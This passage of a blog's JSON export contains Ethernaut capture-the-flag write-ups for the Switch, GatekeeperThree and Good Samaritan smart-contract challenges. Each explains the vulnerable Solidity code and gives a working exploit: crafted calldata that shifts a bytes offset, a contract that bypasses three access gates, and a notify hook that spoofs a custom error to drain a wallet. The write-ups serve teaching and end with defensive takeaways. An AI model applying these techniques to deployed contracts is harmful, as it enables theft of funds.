make sure foundry has installed successfully.\n1$ cast -V 1 2function hello(uint256 _num) public pure returns (uint256) { 3 return _num; 4} Suppose there is a function like this in a contract. When you call this function, the calldata won\u0026rsquo;t be sent as the name of the function. Instead, it will be the hash of the function name along with its arguments, which is also called the function selector. Along with the function selector, the actual arguments data is sent.\nIf you want to call this function, the calldata will be 0xb0f0c96a0000000000000000000000000000000000000000000000000000000000000064. You can obtain the calldata using cast. Enter the following:\n1$ cast calldata \u0026#34;hello(uint256)\u0026#34; \u0026#34;100\u0026#34; The output will be 0xb0f0c96a0000000000000000000000000000000000000000000000000000000000000064.\n1$ cast pretty-calldata 0xb0f0c96a0000000000000000000000000000000000000000000000000000000000000064 -o The output will be as follows.\nThe method is identified by the function selector 0xb0f0c96a, followed by the arguments passed to the function 0000000000000000000000000000000000000000000000000000000000000064. If there are no arguments, the calldata will consist only of the function selector.\nSuppose if the function is taking arguments as dynmaic array and a uint256 then abi encoding will be different.\n1$ cast calldata \u0026#34;hello(uint256[],uint256)\u0026#34; \u0026#34;[100,200]\u0026#34; \u0026#34;300\u0026#34; The output will be 0x4ea346760000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012c0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000c8\n1$ cast pretty-calldata 0x4ea346760000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012c0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000c8 The output will be as follows\nIf we see the arguments of the latest hello() function, we can observe the first argument is a dynamic array. Since the size of a dynamic array is not fixed, the first slot will contain the pointer to where the array elements start. Then in the second slot, it will store the second argument of the array.\nIn the zeroth slot (0x00), it is storing 0x40. 0x40 is the place where the length of the array is stored. In the first slot (0x20), it is storing the second argument (300 = 0x12c). In the second slot (0x40), it is storing the length of the array. In the third (0x60) and fourth (0x80) slots, the actual elements of the array are stored. If the argument is a static array, then:\nIn the zeroth slot (0x00) and first slot (0x20), it will store the elements of the array. In the second slot, it will store the second argument uint256 (300). I hope this makes sense. If you feel confusing click here to read the solidity documentation.\nWhatever examples you see there, try those examples in your terminal using cast and visualize the output.\nContract Explaination If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Switch { 5 bool public switchOn; // switch is off 6 bytes4 public offSelector = bytes4(keccak256(\u0026#34;turnSwitchOff()\u0026#34;)); 7 8 modifier onlyThis() { 9 require(msg.sender == address(this), \u0026#34;Only the contract can call this\u0026#34;); 10 _; 11 } 12 13 modifier onlyOff() { 14 // we use a complex data type to put in memory 15 bytes32[1] memory selector; 16 // check that the calldata at position 68 (location of _data) 17 assembly { 18 calldatacopy(selector, 68, 4) // grab function selector from calldata 19 } 20 require(selector[0] == offSelector, \u0026#34;Can only call the turnOffSwitch function\u0026#34;); 21 _; 22 } 23 24 function flipSwitch(bytes memory _data) public onlyOff { 25 (bool success,) = address(this).call(_data); 26 require(success, \u0026#34;call failed :(\u0026#34;); 27 } 28 29 function turnSwitchOn() public onlyThis { 30 switchOn = true; 31 } 32 33 function turnSwitchOff() public onlyThis { 34 switchOn = false; 35 } 36} The Switch contract has two state variables:\nswitchOn: A boolean (bool) that indicates whether the switch is on. offSelector: A 4-byte (bytes4) variable that stores the function selector of the turnSwitchOff() function. 1 modifier onlyThis() { 2 require(msg.sender == address(this), \u0026#34;Only the contract can call this\u0026#34;); 3 _; 4 } The onlyThis modifier ensures that only the contract itself can call the function that uses this modifier.\n1modifier onlyOff() { 2 // we use a complex data type to put in memory 3 bytes32[1] memory selector; 4 // check that the calldata at position 68 (location of _data) 5 assembly { 6 calldatacopy(selector, 68, 4) // grab function selector from calldata 7 } 8 require(selector[0] == offSelector, \u0026#34;Can only call the turnOffSwitch function\u0026#34;); 9 _; 10} The modifier onlyOff() will copy 4 bytes from the calldata starting from the 68th byte into selector. It will compare the copied 4 bytes of data with offSelector (the function selector of turnSwitchOff). If it matches, the modifier will pass.\n1function flipSwitch(bytes memory _data) public onlyOff { 2 (bool success,) = address(this).call(_data); 3 require(success, \u0026#34;call failed :(\u0026#34;); 4 } The flipSwitch() function will take an argument of type bytes as input. Then it will execute the onlyOff modifier. If the modifier passes, it will make the call to this contract with the data passed.\n1function turnSwitchOn() public onlyThis { 2 switchOn = true; 3} The turnSwitchOn() function, when called, will execute the onlyThis modifier. If it passes, it will set switchOn to true.\n1function turnSwitchOff() public onlyThis { 2 switchOn = false; 3} The turnSwitchOff() function, when called, will execute the onlyThis modifier. If it passes, it will set switchOn to false.\nExploit The goal of this challenge is to make the switchOn true.\nThe only place at which switchOn is set to true is turnSwitchOn() function. But the onlyThis modifier will ensure that only the contract is calling the turnSwitchOn() function. So we won\u0026rsquo;t be able to directly call the turnSwitchOn() function.\n1function flipSwitch(bytes memory _data) public onlyOff { 2 (bool success,) = address(this).call(_data); 3 require(success, \u0026#34;call failed :(\u0026#34;); 4} If we check the flipSwitch() function, it takes a bytes input. It then calls a function in the same contract whose function selector matches the data passed. Here if we pass the function selector of turnSwitchOn() it should call the turnSwitchOn() function but the onlyOff modifier will ensure that data passed is the function selector of turnSwitchOff() function.\nNow lets observe the calldata for this function call assuming that we are calling turnSwitchOff function\n1$ cast sig \u0026#34;turnSwitchOff()\u0026#34; This will return 0x20606e15.\n1$ cast calldata \u0026#34;flipSwitch(bytes)\u0026#34; \u0026#34;0x20606e15\u0026#34; This will return 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000.\nNow lets breakdown the calldata.\n1$ cast pretty-calldata 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000 It will return as follows\nThe arguemnt to flipSwitch() is of type bytes. bytes is a dynamic variable in solidity. So the value of bytes directly store in the first slot instead in the first slot it will store the offset at which the actual bytes start.\nHere in the zeroth slot (0x00) it is storing (0x20) it is the offset at which the length of bytes is stored. Then in first slot (0x20) the length of bytes is stored. Then in the second slot (0x40) the actual bytes data is stored.\nSo during the function call the first argument value is purely depended on the pointer which is store at zeroth slot (0x00). Instead of pointing it to 0x20 if we make it to point 0x60 and then at 0x60 we need to send the length of bytes data and at 0x80 we need to send the actual bytes data.\nIf we do as above then call data will be as follows\nNow when we pass this data to the Switch contract, we are calling the flipSwitch() function, and the argument to the function refers to data in the zeroth slot (0x00), which is a pointer to the third slot (0x60). So it will get data from 0x60.\nIf we check the onlyOff modifier, it is copying 4 bytes of data starting from the 68th byte (4 bytes of function selector + 0x40) into a temporary array named selector. Then it compares the first element in the selector array with the offSelector.\nIn our data at 0x40, the data is the function selector of turnSwitchOff(), and offSelector is also the function selector of turnSwitchOff(). Since both match, the modifier will pass, but it will make a call to turnSwitchOn().\nThat\u0026rsquo;s it if you send this calldata to Switch contract then the challenge will be solved. Below is the Exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract ExploitSwitch { 5 address Switch; 6 constructor(address _addr){ 7 Switch=_addr; 8 } 9 function Exploit() public { 10 bytes memory Calldata=hex\u0026#34;30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000\u0026#34;; 11 (bool a,)=Switch.call(Calldata); 12 require(a,\u0026#34;Exploit Failed\u0026#34;); 13 } 14} That\u0026rsquo;s it for this challenge. Hope you enjoyed this challege\nKey takeaways We should try to avoid depending on our logic based on calldata because calldata can be manipulated.\nIn this case, instead of comparing the value at the 68th byte, it should first check where the zeroth slot (0x00) is pointing. Then the calldatacopy should get data from that location and compare the value. If we do this, we can prevent this exploit.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/switch/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Assembly","url":"/tags/assembly/"},{"title":"Calldata Manipulation","url":"/tags/calldata-manipulation/"}],"timestamp":1729626693,"title":"Switch"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Gatekeeper Three Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Cope with gates and become an entrant.\nThings that might help:\nRecall return values of low-level functions. Be attentive with semantic. Refresh how storage works in Ethereum. Contract Explaination If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nFirst i will explain the SimpleTrick contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract SimpleTrick { 5 GatekeeperThree public target; 6 address public trick; 7 uint256 private password = block.timestamp; 8 9 constructor(address payable _target) { 10 target = GatekeeperThree(_target); 11 } 12 13 function checkPassword(uint256 _password) public returns (bool) { 14 if (_password == password) { 15 return true; 16 } 17 password = block.timestamp; 18 return false; 19 } 20 21 function trickInit() public { 22 trick = address(this); 23 } 24 25 function trickyTrick() public { 26 if (address(this) == msg.sender \u0026amp;\u0026amp; address(this) != trick) { 27 target.getAllowance(password); 28 } 29 } 30} The SimpleTrick contract has three state variables named target, trick, and password. The target is of type GatekeeperThree (address), trick is of type address, and password is of type uint256 and is initialized to block.timestamp.\n1constructor(address payable _target) { 2 target = GatekeeperThree(_target); 3} The constructor takes an address of payable type as input and initializes the target with a GatekeeperThree instance of the address passed.\n1function checkPassword(uint256 _password) public returns (bool) { 2 if (_password == password) { 3 return true; 4 } 5 password = block.timestamp; 6 return false; 7} The function checkPassword() takes an argument of type uint256 (_password) as input and compares the _password passed with the password stored in the contract. If both match, it will return true. If not, it will set the password to block.timestamp and return false.\n1 2function trickInit() public { 3 trick = address(this); 4} The trickInit() function sets the trick variable to address(this) (the contract address of the SimpleTrick contract).\n1function trickyTrick() public { 2 if (address(this) == msg.sender \u0026amp;\u0026amp; address(this) != trick) { 3 target.getAllowance(password); 4 } 5} The function trickyTrick() is a public function. It checks if the msg.sender (caller) is the SimpleTrick contract and if trick is not the SimpleTrick contract address. If both conditions are satisfied, it will call the getAllowance() function in the GatekeeperThree contract by passing the password as an argument.\nNow i will explain the GatekeeperThree contract.\n1contract GatekeeperThree { 2 address public owner; 3 address public entrant; 4 bool public allowEntrance; 5 6 SimpleTrick public trick; 7 8 function construct0r() public { 9 owner = msg.sender; 10 } 11 12 modifier gateOne() { 13 require(msg.sender == owner); 14 require(tx.origin != owner); 15 _; 16 } 17 18 modifier gateTwo() { 19 require(allowEntrance == true); 20 _; 21 } 22 23 modifier gateThree() { 24 if (address(this).balance \u0026gt; 0.001 ether \u0026amp;\u0026amp; payable(owner).send(0.001 ether) == false) { 25 _; 26 } 27 } 28 29 function getAllowance(uint256 _password) public { 30 if (trick.checkPassword(_password)) { 31 allowEntrance = true; 32 } 33 } 34 35 function createTrick() public { 36 trick = new SimpleTrick(payable(address(this))); 37 trick.trickInit(); 38 } 39 40 function enter() public gateOne gateTwo gateThree { 41 entrant = tx.origin; 42 } 43 44 receive() external payable {} 45} The contract has 4 state variables named owner, entrant, allowEntrance, trick.\n1function construct0r() public { 2 owner = msg.sender; 3 } The construct0r() function sets the owner to msg.sender (the caller or deployer of the contract).\n1modifier gateOne() { 2 require(msg.sender == owner); 3 require(tx.origin != owner); 4 _; 5} The modifier gateOne will check if msg.sender (caller) is the owner. If the caller is not the owner, it will revert. It also checks whether tx.origin (transaction initiator EOA) is the owner or not. If tx.origin is the owner, it will revert.\n1modifier gateTwo() { 2 require(allowEntrance == true); 3 _; 4} 1modifier gateTwo() { 2 require(allowEntrance == true); 3 _; 4} The modifier gateTwo will check if the allowEntrance is true or not. If it is not true then it will revert.\n1modifier gateThree() { 2 if (address(this).balance \u0026gt; 0.001 ether \u0026amp;\u0026amp; payable(owner).send(0.001 ether) == false) { 3 _; 4 } 5} The modifier gateThree will check if the balance of the GatekeeperThree contract is greater than 0.001 ether and if the return value of the send() function is false. If the send() function returns true or the contract balance is less than 0.001 ether, the function implementing this modifier will not execute.\nOne important thing to observe here is that even if the condition fails, the function call won\u0026rsquo;t revert because the modifier is not reverting. So, if the condition in the modifier fails, it won\u0026rsquo;t revert the function, but it also won\u0026rsquo;t execute the function because _ is inside the if condition. The function will be executed only if the the modifier execution reaches the _; .\n1 2function getAllowance(uint256 _password) public { 3 if (trick.checkPassword(_password)) { 4 allowEntrance = true; 5 } 6} The getAllowance() function takes an argument of type uint256 (_password) as input and calls the checkPassword() function in the SimpleTrick contract. If the checkPassword() function returns true, then it sets allowEntrance to true.\n1function createTrick() public { 2 trick = new SimpleTrick(payable(address(this))); 3 trick.trickInit(); 4} The createTrick() function creates a new instance of the SimpleTrick contract and assigns the instance to the variable trick. Then it calls the trickInit() function in the SimpleTrick contract.\n1function enter() public gateOne gateTwo gateThree { 2 entrant = tx.origin; 3} The function enter() is a public function that executes the modifiers gateOne, gateTwo, and gateThree. If all the modifiers pass, then it sets the entrant to tx.origin (initiator of the transaction).\n1receive() external payable {} The contract has a receive() function. When someone interacts with this contract by sending some data that doesn\u0026rsquo;t match any function selector, the receive() function will be called. It will also be called if someone sends ether to the contract without calling any function.\nExploit Our goal is to become the entrant. The only way we can become the entrant is by calling the enter() function. In order to become the entrant we need to pass the three modifiers. So let\u0026rsquo;s try to pass each modifier one by one. We was given the instance of GatekeeperThree contract.\n1modifier gateOne() { 2 require(msg.sender == owner); 3 require(tx.origin != owner); 4 _; 5} This modifier can be passed by setting up our Exploit contract address as the owner and then interacting with the enter() function from the Exploit contract. If we do that, msg.sender will be our Exploit contract address and owner will also be our Exploit contract address. Then tx.origin will be our wallet address since we are calling the function in our Exploit contract and that function is calling the enter() function. So the tx.origin (EOA) won\u0026rsquo;t be equal to the Exploit contract address.\nWe set up our Exploit contract address as owner by calling the construct0r() function in GatekeeperThree contract.\nNow lets pass the Second Gate.\n1modifier gateTwo() { 2 require(allowEntrance == true); 3 _; 4} The modifier gateTwo can be passed by setting the allowEntrance variable to true. The allowEntrance value depends on the getAllowance() function. If we pass the password to getAllowance(), it calls the checkPassword() function in the SimpleTrick contract and checks if the password is correct. If it is correct, it will return true.\nIf we see the checkPassword() function in the SimpleTrick contract, it compares the _password passed as an argument with the password stored in the state variable. If both match, it will return true. So, in order to know the correct password, we need to check the value at slot 2 in the SimpleTrick contract because the password is stored in slot 2. In order to check the value at slot 2, we need the contract address of the SimpleTrick contract. They didn\u0026rsquo;t give the address of the SimpleTrick contract. They gave us the instance of the GatekeeperThree contract.\nIn the GatekeeperThree contract, the 4th state variable is the address of the SimpleTrick contract. From that, we can know the address of the SimpleTrick contract. So now it\u0026rsquo;s time to open the console.\n1await contract.trick(); It will return 0x0000000000000000000000000000000000000000, which means the SimpleTrick contract is not deployed. However, if we look at the createTrick() function, it will create an instance of the SimpleTrick contract and assign it to trick. We are the ones calling the createTrick() function and making the instance of the SimpleTrick contract. Instead of calling the createTrick() function in the console, if we call it from our Exploit contract, it will be easier for us to get the password because the password is set to block.timestamp in SimpleTrick contract. Since we are calling createTrick() from our Exploit contract, we can call it from a function in the Exploit contract and within that function, we can call the getAllowance() function and directly pass block.timestamp to it, which will allow us to pass the second gate successfully.\nTill here how Exploit contract will look like the following.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4interface IGateKeeperThree{ 5 function enter() external; 6 function construct0r() external; 7 function getAllowance(uint256 _password) external; 8 function createTrick() external; 9} 10 11contract ExploitGateKeeperThree{ 12 IGateKeeperThree gateKeeperThree; 13 14 constructor(address _addr){ 15 gateKeeperThree=IGateKeeperThree(_addr); 16 } 17 18 function Exploit()public payable{ 19 gateKeeperThree.construct0r(); 20 gateKeeperThree.createTrick(); 21 gateKeeperThree.getAllowance(block.timestamp); 22 gateKeeperThree.enter(); 23 24 } 25} Now we also need to pass modifier three. So we need make some more calls in the Exploit() function before the enter() function.\n1modifier gateThree() { 2 if (address(this).balance \u0026gt; 0.001 ether \u0026amp;\u0026amp; payable(owner).send(0.001 ether) == false) { 3 _; 4 } 5} The modifier gateThree() will check if the contract has a balance greater than 0.001 ether. So, we need to send the GatekeeperThree contract some ether, more than 0.001 ether. Another condition it checks is when it tries to send some ether to the owner (Exploit contract), it expects the transaction to return false, which means the transaction should fail. If our Exploit contract doesn\u0026rsquo;t have the receive() function, then this condition will be satisfied.\nSo now, in our Exploit() function, before calling enter(), we need to send ether greater than 0.001 etherto the GatekeeperThree contract. Below is the final Exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4interface IGateKeeperThree{ 5 function enter() external; 6 function construct0r() external; 7 function getAllowance(uint256 _password) external; 8 function createTrick() external; 9} 10 11 12contract ExploitGateKeeperThree{ 13 IGateKeeperThree gateKeeperThree; 14 15 constructor(address _addr){ 16 gateKeeperThree=IGateKeeperThree(_addr); 17 18 } 19 20 function Exploit()public payable{ 21 gateKeeperThree.construct0r(); 22 gateKeeperThree.createTrick(); 23 gateKeeperThree.getAllowance(block.timestamp); 24 address(gateKeeperThree).call{value:1000000000000001}(\u0026#34;\u0026#34;); 25 gateKeeperThree.enter(); 26 } 27} Once you deploy this Exploit contract and call Exploit() function the challenge will be solved. Hope you enjoyed this challenge.\nKey takeaways When someone is sending ether to a contract and if the contract doesn\u0026rsquo;t have a receive() function, the transaction will fail.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/gatekeeperthree/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Access Control","url":"/tags/access-control/"}],"timestamp":1729626650,"title":"GateKeeperThree"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Good Samaritan Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.\nWould you be able to drain all the balance from his Wallet?\nThings that might help:\nSolidity Custom Errors Key Concepts To Learn In order to solve this challenge you need to learn how errors works in solidity. I will be explaining two types of errors in solidity.\nWhile writing contracts we will write some checks for function calls. If the checks are not satisfied we will revert. But reverting an be done in two ways. Check the below examples.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract FortaA{ 5 error NotEnoughBalance(); 6 7 function hello()external pure { 8 revert(\u0026#34;NotEnoughBalance()\u0026#34;); 9 } 10} When we revert in this way during the revert the function will return the \u0026ldquo;NotEnoughBalance()\u0026rdquo; as string in hex format. Check the below example observe that.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract FortaA{ 5 6 function hello()external pure { 7 revert(\u0026#34;NotEnoughBalance()\u0026#34;); 8 } 9} 10 11 12contract Forta { 13 error NotEnoughBalance(); 14 bytes public mainerr; 15 FortaA forta=FortaA(//__FortaA_ADDRESS); 16 17 18 function notify() external { 19 try forta.hello() { 20 } catch (bytes memory arr) { 21 mainerr=(arr); 22 } 23 } 24 25} Deploy the FortaA contract first and then Deploy Forta contract. Once you deploy call notify() function in Forta. It will return bunch of bytes data. When you convert that bytes data from hex to string you will get the reverted string. Check the below image.\nNow i will explain custom errors. Check the below example.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5contract FortaA{ 6 error NotEnoughBalance(); 7 8 function hello()external pure { 9 revert NotEnoughBalance(); 10 } 11} 12 13 14contract Forta { 15 error NotEnoughBalance(); 16 bytes public mainerr; 17 FortaA forta=FortaA(//__FortaA_ADDRESS); 18 19 20 function notify() external { 21 try forta.hello() { 22 } catch (bytes memory arr) { 23 mainerr=(arr); 24 } 25 } 26 27} Deploy the FortaA contract first and then Deploy Forta contract. Once you deploy call notify() function in Forta. It will return function selector of \u0026quot;NotEnoughBalance()\u0026quot;.\nContract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\n1// SPDX-License-Identifier: MIT 2pragma solidity \u0026gt;=0.8.0 \u0026lt;0.9.0; 3 4import \u0026#34;openzeppelin-contracts-08/utils/Address.sol\u0026#34;; 5 6contract GoodSamaritan { 7 Wallet public wallet; 8 Coin public coin; 9 10 constructor() { 11 wallet = new Wallet(); 12 coin = new Coin(address(wallet)); 13 14 wallet.setCoin(coin); 15 } 16 17 function requestDonation() external returns (bool enoughBalance) { 18 // donate 10 coins to requester 19 try wallet.donate10(msg.sender) { 20 return true; 21 } catch (bytes memory err) { 22 if (keccak256(abi.encodeWithSignature(\u0026#34;NotEnoughBalance()\u0026#34;)) == keccak256(err)) { 23 // send the coins left 24 wallet.transferRemainder(msg.sender); 25 return false; 26 } 27 } 28 } 29} First i will explain GoodSamaritan contract.\nGoodSamaritan contract has two state variables wallet (address) and coin (address) . wallet is of type Wallet and coin is of type Coin. Wallet and Coin are two contracts.\n1 2constructor() { 3 wallet = new Wallet(); 4 coin = new Coin(address(wallet)); 5 6 wallet.setCoin(coin); 7} The constructor creates a Wallet contract and Coin contract. Then it will call the setCoin() function in the Wallet contract.\n1function requestDonation() external returns (bool enoughBalance) { 2 // donate 10 coins to requester 3 try wallet.donate10(msg.sender) { 4 return true; 5 } catch (bytes memory err) { 6 if (keccak256(abi.encodeWithSignature(\u0026#34;NotEnoughBalance()\u0026#34;)) == keccak256(err)) { 7 // send the coins left 8 wallet.transferRemainder(msg.sender); 9 return false; 10 } 11 } 12 } The function requestDonation() is an external function, which means it can only be called by other contracts or EOAs. The function will execute the code in the try block and call the donate10() function in the Wallet contract. If the function call is successful, it will return true. If there is any error while calling the donate10() function, then the code in the catch block will execute instead of reverting. The catch block will check if the error is NotEnoughBalance() or not. If it is NotEnoughBalance(), then it will call the transferRemainder() function in the Wallet contract and then return false.\nNow i will explain the Coin contract.\n1 2interface INotifyable { 3 function notify(uint256 amount) external; 4} 5 6contract Coin { 7 using Address for address; 8 9 mapping(address =\u0026gt; uint256) public balances; 10 11 error InsufficientBalance(uint256 current, uint256 required); 12 13 constructor(address wallet_) { 14 // one million coins for Good Samaritan initially 15 balances[wallet_] = 10 ** 6; 16 } 17 18 function transfer(address dest_, uint256 amount_) external { 19 uint256 currentBalance = balances[msg.sender]; 20 21 // transfer only occurs if balance is enough 22 if (amount_ \u0026lt;= currentBalance) { 23 balances[msg.sender] -= amount_; 24 balances[dest_] += amount_; 25 26 if (dest_.isContract()) { 27 // notify contract 28 INotifyable(dest_).notify(amount_); 29 } 30 } else { 31 revert InsufficientBalance(currentBalance, amount_); 32 } 33 } 34} The Coin contract has a single state variable balances. The balances is a mapping of address to uint256. It basically stores the balance of each address that holds this coin.\nThe contract is using the Address library for address variables, which means all the functions in the library can be used on addresses.\nThe contract has an error InsufficientBalance() which takes two arguments of type uint256 as inputs.\n1constructor(address wallet_) { 2 // one million coins for Good Samaritan initially 3 balances[wallet_] = 10 ** 6; 4} In the constructor, it takes the address of the Wallet contract as input and sets the balance of the Wallet contract to 10^6. The GoodSamaritan contract passes the address of Wallet contract to the constructor of Coin contract.\n1function transfer(address dest_, uint256 amount_) external { 2 uint256 currentBalance = balances[msg.sender]; 3 // transfer only occurs if balance is enough 4 if (amount_ \u0026lt;= currentBalance) { 5 balances[msg.sender] -= amount_; 6 balances[dest_] += amount_; 7 8 if (dest_.isContract()) { 9 // notify contract 10 INotifyable(dest_).notify(amount_); 11 } 12 } else { 13 revert InsufficientBalance(currentBalance, amount_); 14 } 15} The transfer() function takes two arguments of type address (dest*) and uint256 (amount*) as input. The function will make some checks, and if all checks pass, it will send the specified amount to the destination address. If the destination address is a contract, it will call the notify() function in the destination contract.\nNow let\u0026rsquo;s go through Wallet contract.\n1contract Wallet { 2 // The owner of the wallet instance 3 address public owner; 4 5 Coin public coin; 6 7 error OnlyOwner(); 8 error NotEnoughBalance(); 9 10 modifier onlyOwner() { 11 if (msg.sender != owner) { 12 revert OnlyOwner(); 13 } 14 _; 15 } 16 17 constructor() { 18 owner = msg.sender; 19 } 20 21 function donate10(address dest_) external onlyOwner { 22 // check balance left 23 if (coin.balances(address(this)) \u0026lt; 10) { 24 revert NotEnoughBalance(); 25 } else { 26 // donate 10 coins 27 coin.transfer(dest_, 10); 28 } 29 } 30 31 function transferRemainder(address dest_) external onlyOwner { 32 // transfer balance left 33 coin.transfer(dest_, coin.balances(address(this))); 34 } 35 36 function setCoin(Coin coin_) external onlyOwner { 37 coin = coin_; 38 } 39} The Wallet contract has a state variable of type Coin (address).\nThe contract has two errors defined: OnlyOwner() and NotEnoughBalance().\nThe onlyOwner() modifier will check if the msg.sender (caller) is the owner or not. If the caller is not the owner, it will revert with the OnlyOwner() error.\nThe constructor sets the owner to msg.sender (deployer of Wallet contract).\n1function donate10(address dest_) external onlyOwner { 2 // check balance left 3 if (coin.balances(address(this)) \u0026lt; 10) { 4 revert NotEnoughBalance(); 5 } else { 6 // donate 10 coins 7 coin.transfer(dest_, 10); 8 } 9} The donate10() function will take an argument of type address as input and execute the onlyOwner modifier. If the modifier passes, it will check if the Wallet contract has enough balance. If the Wallet contract balance is less than 10, it will revert with a NotEnoughBalance() error. If it has a balance of 10 or more, it will call the transfer() function in the Coin contract.\n1function transferRemainder(address dest_) external onlyOwner { 2 // transfer balance left 3 coin.transfer(dest_, coin.balances(address(this))); 4} The transferRemainder() function will take an argument of type address (dest_) as input and execute the onlyOwner modifier. If the modifier passes, it will call the transfer function by passing the destination address and the balance of the Wallet contract as arguments.\n1function setCoin(Coin coin_) external onlyOwner { 2 coin = coin_; 3} The setCoin() function will take an argument of type Coin (address) as input and execute the onlyOwner modifier. If the modifier passes, it will set the coin to the new Coin passed.\nExploit Our goal is to drain the balance of the Wallet contract.\nWe was given the instance of GoodSamaritan contract. In this contract the only function with which we can interact is requestDonation().\nWhen we call requestDonation, it will call the donate10() function in the Wallet contract. The donate10() function will check whether the Wallet contract has a balance less than 10 or not. If it has a balance less than 10, it will revert with the NotEnoughBalance() error. If it has a balance of 10 or more, it will call the transfer() function in the Coin contract. The transfer() function will transfer 10 coins to the address passed by donate10(). If the receiver is a contract, the transfer() function will call the notify() function in the receiver.\nBut if the donate10() function reverts with the NotEnoughBalance() error, then the requestDonation() function in GoodSamaritan will call the transferRemainder() function in the Wallet contract. The transferRemainder() function will transfer the entire balance of the Wallet contract to the address passed by donate10().\nAccording to the contract logic, the NotEnoughBalance() error will be thrown only if the balance of the Wallet contract is less than 10. So when the balance is less than 10, it transfers the entire balance to the latest person who called the requestDonation() function in the GoodSamaritan contract. After this call, no one will be able to call requestDonation() and get donations.\nIf we check the constructor of the Coin contract, it sets the balance of the Wallet to 10^6. So, in order to drain the balance of the Wallet contract, we need to call the requestDonation() function 10^5 times, which will be a time-consuming task. Therefore, we need a shorter way to get the entire coins.\nIf we somehow make the donate10() function revert with the message NotEnoughBalance(), then it will transfer the entire tokens.\nSuppose there are three contracts, and a function in one of the contracts calls functions in the other two contracts. If the functions in the other two contracts return the same error upon failure of some conditions, then the calling function won\u0026rsquo;t be able to determine which contract the error originated from. We can take this as advantage and we can exploit the GoodSamaritan contract.\nNow when we call the requestDonation in the GoodSamaritan contract, it will call donate10() in the Wallet contract. Then donate10() will call transfer() in the Coin contract, and the transfer() function will transfer 10 coins to the receiver. If the receiver is a contract, it will call the notify() function in the receiver contract, passing the amount of the transfer as an argument to notify().\nSo in our Exploit contract, when the notify() function is called, we need to check if the transfer amount is 10 or not. If it is 10, then we need to revert with a NotEnoughBalance() error. Then the transfer() function will be reverted, and subsequently, the donate10() function will be reverted. Both calls will be reverted with data as the function selector of the NotEnoughBalance() error. Now the try block in requestDonation() will fail, and it will execute the catch block by passing the same error. Since the error returns the function selector of NotEnoughBalance(), the if condition will pass, and it will transfer the entire coins to the requestDonation() caller.\nBelow is the Exploit contract code.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5 6interface IGoodSamaritan{ 7 function requestDonation()external returns (bool); 8} 9 10contract ExploitGoodSamaritan{ 11 //////////////////////// 12 //////Errors//////////// 13 //////////////////////// 14 15 error NotEnoughBalance(); 16 17 /////////////////////// 18 ///State Variables///// 19 /////////////////////// 20 21 IGoodSamaritan samaritan; 22 23 constructor(address _addr){ 24 samaritan=IGoodSamaritan(_addr); 25 } 26 27 28 function Exploit()public{ 29 samaritan.requestDonation(); 30 } 31 32 function notify(uint256 _amount)public payable{ 33 if(_amount==10){ 34 revert NotEnoughBalance(); 35 } 36 37 } 38 39} Deploy this contract and call the Exploit() function. Once the call is done successfully the challenge will be solved.\nHope you enjoyed this challenge.\nKey takeaways We should not write our contract logic based on errors unless we are sure that the errors can only be thrown by our contract itself or in the way we intended. If our contract logic depends on errors and makes calls to other contracts, then malicious actors may revert with the same error and exploit our contract logic.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 